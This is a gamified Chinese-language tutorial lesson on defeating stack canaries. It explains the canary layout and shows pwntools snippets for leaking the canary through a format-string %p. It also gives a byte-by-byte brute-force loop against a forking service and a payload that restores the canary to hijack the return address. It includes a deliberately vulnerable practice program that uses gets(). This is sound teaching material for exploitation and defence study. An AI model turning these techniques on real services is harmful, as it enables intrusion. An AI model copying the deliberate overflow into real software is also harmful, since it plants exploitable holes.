# 第 12 关 · Canary：骗过餐桌上的警报器

## 🎬 游戏开场

之前你打的都是"无保护的新手福利关"。现在敌人开了一个新 Buff：**Canary（栈保护）**。

游戏里，每个函数开始时，会在栈上、局部变量和返回地址之间，悄悄插一个**随机令牌**（就跟餐厅餐桌上的警报器一样）。函数返回前，程序会检查这个令牌还在不在、值变没变。

你一栈溢出，数据就会先碰到令牌——检查失败，游戏立刻弹出：

```
*** stack smashing detected ***: terminated
```

直接崩溃。硬来是打不通的。

但游戏的 BUG 是：**警报器只是"对比数值"，它不认人**。如果你提前知道了令牌是多少，溢出时把它**原封不动填回去**，警报器就不会响——哪怕你把返回地址改得面目全非。

所以本关的任务是：**先偷到令牌（泄露 Canary），再原样奉还。**

---

## 🧠 核心概念（游戏版）

### 1. Canary 长什么样？

Canary 是一个 8 字节的随机数，平时藏在栈上：

```
低地址
  ┌──────────────────┐
  │  buf[16]          │ ← 你的输入
  ├──────────────────┤
  │  Canary (8字节)    │ ← 随机令牌，最低1字节是 \x00
  ├──────────────────┤
  │  旧 rbp           │
  ├──────────────────┤
  │  返回地址         │
  └──────────────────┘
高地址
```

**关键细节**：Canary 的**最低 1 字节总是 `0x00`**（空字符）。这是故意的——防止被 `strcpy` 之类的字符串函数连着读出去。记住这个 `\x00`，爆破时会用到。

程序收尾时的检查逻辑（简化）：

```asm
mov rax, [rsp+canary_offset]   ; 取出当前栈上的 Canary
xor rax, [fs:0x28]             ; 和初始的随机值对比（TLS里存的那个）
jne  → 崩溃                    ; 不一样？有人动过！
```

### 2. 破解法一：格式化字符串泄露（最优雅）

如果程序有格式化字符串漏洞（第 14 关详讲），比如 `printf(user_input)`，你可以用一个特殊的 `%p` 把栈上的 Canary 打印出来：

```python
# 用 %p 逐个打印栈上的值，找到 Canary
p.sendline(b'%15$p')     # 假设 Canary 在第15个参数位置
leak = p.recvline()
canary = int(leak, 16)
```

然后用它构造 payload：

```python
payload  = b'A' * 16           # 填满 buf
payload += p64(canary)         # 原样奉还令牌！
payload += b'A' * 8            # 覆盖 rbp
payload += p64(target_addr)    # 现在可以放心改返回地址了
```

### 3. 破解法二：逐字节爆破（最通用）

如果程序会**fork 子进程**（每次连接 Canary 不变），你可以像"猜密码"一样一个字节一个字节试：

1. 先算偏移，确定 Canary 从 buf 之后第几字节开始。
2. 假设 Canary 有 7 个未知字节（最低字节是 `\x00`，已知）。
3. 逐字节爆破：对每个位置，试 0~255，如果程序没崩溃（没触发 `*** stack smashing detected ***`），说明猜对了这个字节。
4. 7 个字节都猜出来后，拼出完整 Canary，再构造正式 payload。

```python
canary = b'\x00'   # 最低字节已知
for i in range(7):
    for guess in range(256):
        p = process('./vuln')
        payload = b'A'*offset + canary + bytes([guess])
        p.sendline(payload)
        resp = p.recvall(timeout=1)
        if b'stack smashing' not in resp:   # 没崩溃 → 猜对了
            canary += bytes([guess])
            break
        p.close()
```

> 🎮 游戏比喻：警报器会告诉你"错了一位"，你一位一位试，试对了它就沉默。最多 7×256=1792 次，完全可接受。

### 4. 破解法三：其他泄露

- 如果有**任意地址读**漏洞，直接读出 Canary 在 TLS 里的值。
- 如果 Canary 是**子进程 fork 继承**的，父进程泄露一次，子进程通用。
- 有些特殊情况能绕过检查本身（如改写 `__stack_chk_fail` 的 GOT 表）。

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 警报器 | Stack Canary / Stack Protector |
| 随机令牌 | 栈上随机的 8 字节值（TLS 里有副本） |
| 原样奉还 | payload 里填回泄露的 Canary |
| 逐字节猜 | byte-by-byte brute force（依赖 fork 不重建 Canary） |

**编译开关**：

```bash
# 关闭 Canary（新手关）
gcc -fno-stack-protector vuln.c -o vuln

# 开启 Canary（默认）
gcc -fstack-protector-all vuln.c -o vuln
```

**checksec 里看到 `Canary found`**，就要想到本章的三种破解法。

---

## 🎯 闯关任务：逐字节爆破 Canary

写个会 fork 的程序（模拟远程服务）：

```c
// canary.c
#include <stdio.h>
#include <unistd.h>
void vuln() {
    char buf[16];
    gets(buf);
    printf("OK\n");
}
int main() {
    while(1) {
        if(fork() == 0) { vuln(); _exit(0); }
        wait(NULL);
    }
}
```

```bash
gcc -g -O0 -no-pie canary.c -o canary
```

任务：

1. 先用 cyclic 测出偏移（应该是 16+8=24，但要验证）。
2. 写脚本逐字节爆破 Canary，验证"猜对时程序不崩溃"。
3. 拿到 Canary 后，构造 payload：填充 + Canary + rbp + 返回地址，验证能控制 rip。

> 提示：`strings` 里搜 `stack smashing` 可以确认 Canary 是否生效。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| Canary | 栈上的随机警报器，被改就崩溃 |
| 破解核心 | 先泄露，再原样填回 |
| 泄露法 | 格式化字符串 `%p` / 任意读 |
| 爆破法 | 逐字节猜（依赖 fork 不重建） |
| 特殊标志 | Canary 最低字节是 `\x00` |

---

## 🎬 下一关预告

**第 13 关 · 栈迁移：换个大点的战场**

栈上功夫的收官招式。有时候你能控制的栈空间太小——比如只能溢出几十字节，放不下完整的 ROP 链。

怎么办？**把整个"战场"搬到一个更大的地方**（比如 .bss 段），在那里从容地摆好 ROP 链。

这招的核心是 `leave; ret` 这组指令的妙用——通过改写 rbp，让程序"以为"栈底在别处。学完这关，栈上功夫大关就毕业了！
